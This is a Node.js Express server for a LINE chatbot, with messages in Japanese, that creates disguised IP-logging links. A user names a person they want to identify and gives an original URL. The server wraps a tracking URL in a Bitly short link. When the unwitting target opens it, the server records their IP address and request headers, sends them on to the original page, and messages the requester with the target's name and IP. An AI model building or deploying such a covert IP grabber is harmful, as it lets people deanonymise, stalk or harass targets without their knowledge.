const https = require("https");
const qs = require("querystring");
const request = require("request");
const express = require("express");
const port = process.env.PORT || 3000;
const TOKEN = process.env.LINE_TOKEN;
const bitly_token = process.env.BITLY_TOKEN;
let original, push_status = false;

const allowCrossDomain = function(req, res, next) {
  res.header('Access-Control-Allow-Origin', '*');
  res.header('Access-Control-Allow-Methods', 'GET,PUT,POST,DELETE');
  res.header(
    'Access-Control-Allow-Headers',
    'Content-Type, Authorization, access_token'
  );
  if('OPTIONS' === req.method){
    res.sendStatus(200)
  }else{
    next()
  }
};

const app = express();

app
  .use(allowCrossDomain)
  .use(express.urlencoded({
    extended: true
  }))
  .use(express.json())
  .post("/webhook", (req, res) => {
    res.send("HTTP POST request sent to the webhook URL!");
    const random = ~~(Math.random() * (999999 - 100000) + 100000);
    const userId = req.body.events[0].source.userId;
    const ms = req.body.events[0].message.text;
    let text = "";
    if (req.body.events[0].type === 'message') {
      if(ms.match(/発行/) || ms.match(/generate/i) || ms.match(/URL/i) || ms.match(/生成/)) {
        text = "https://rhipsali.github.io/get_ip?pass=" + random + "&userId=" + userId + " \n認証コード: " + random + "\n\n上記のサイトで特定したい相手の名前と元のURL、発行された認証コードを入力してください。\n\n※URL発行後の10秒間はアクセスしてもメッセージが送信されません。\nまた10秒後にアクセスしてメッセージが送信されるのは1つのURLに1回のみです。名前や元のURLを変更したい場合は再度発行してください。";
      } else {
        text = "URLを発行したい場合「URLを発行したい」「URLを生成して」などと話しかけてください";
      };
      const dataString = JSON.stringify({
        replyToken: req.body.events[0].replyToken,
        messages: [{"type": "text", "text": text}]
      });
        
      const headers = {
        "Content-Type": "application/json",
        "Authorization": "Bearer " + TOKEN
      };

      const webhookOptions = {
        "hostname": "api.line.me",
        "path": "/v2/bot/message/reply",
        "method": "POST",
        "headers": headers,
        "body": dataString
      };

      const request = https.request(webhookOptions, (res) => {
          res.on("data", (d) => {
            process.stdout.write(d);
          })
        })

      request.on("error", (err) => {
        console.error(err);
      })
    
      request.write(dataString);
      request.end();
    };
  })
  .post("/generated", (req, res) => {
    const name = req.body.name, url = req.body.url, pass = req.query.pass || null, userId = req.query.userId || null;
    const query = {
      name: name,
      original: url,
      id: userId,
      pass: pass
    };
    const longUrl = "https://get-ip-nero.herokuapp.com/get/ip/nero?" + qs.stringify(query),
    req_url = "https://api-ssl.bitly.com/v3/shorten?" + qs.stringify({
      access_token: bitly_token,
      longUrl: longUrl
    });
    const options = {
      url: req_url,
      method: "GET",
      json: true
    };
    request(options, (err, response, body) => {
      if (err || body.status_code !== 200) {console.log(err); return};
      const generated = body.data.url || longUrl;
      res.send(JSON.stringify({access_url: generated}));
      setTimeout(() => {
        push_status = true;
      }, 10000);
    });
  })
  .get("/get/ip/nero", (req, res) => {
    const nom = req.query.name, id = req.query.id, pass = req.query.pass;
    original = req.query.original;
    res.sendFile(__dirname + '/open.html');
    if (!nom || !id || !pass || !original) {
      push_status = false;
    };
    const ip = req.headers['x-forwarded-for'] || req.connection.remoteAddress || req.connection.socket.remoteAddress || req.socket.remoteAddress || '0.0.0.0', 
    str = (ip.match(/[^0-9.]/g)) ? ip.replace(/[^0-9.]/g, "") : ip;
    console.log(`名前: ${nom}\nIPアドレス: ${str}`);
    console.log(req.headers);
    if(push_status && id && pass) {
      setTimeout( () => {
        pushMsg(`${nom}さんがURLにアクセスしました\nIPアドレス: ${str}`, id);

        push_status = false;
      }, 300);
    };
  })
  .get("/auth", (req, res) => {
    const URL = original || "https://rhipsali.github.io/get_ip";
    res.send(JSON.stringify({url: URL}));
  })
  .listen(port, () => console.log("listening on " + port))
;

function pushMsg(text, id) {
  const msg = JSON.stringify({
    to: id,
    messages: [
      {"type": "text", "text": text}
    ]
  });

  const headers = {
    "Content-Type": "application/json",
    "Authorization": "Bearer " + TOKEN
  };
  const webhookOptions = {
    "hostname": "api.line.me",
    "path": "/v2/bot/message/push",
    "method": "POST",
    "headers": headers,
    "body": msg
  };
  const request = https.request(webhookOptions, (res) => {
    res.on("data", (d) => {
      process.stdout.write(d);
    });
  });
  request.on("error", (err) => {
    console.error(err);
  });
  request.write(msg);
  request.end();
};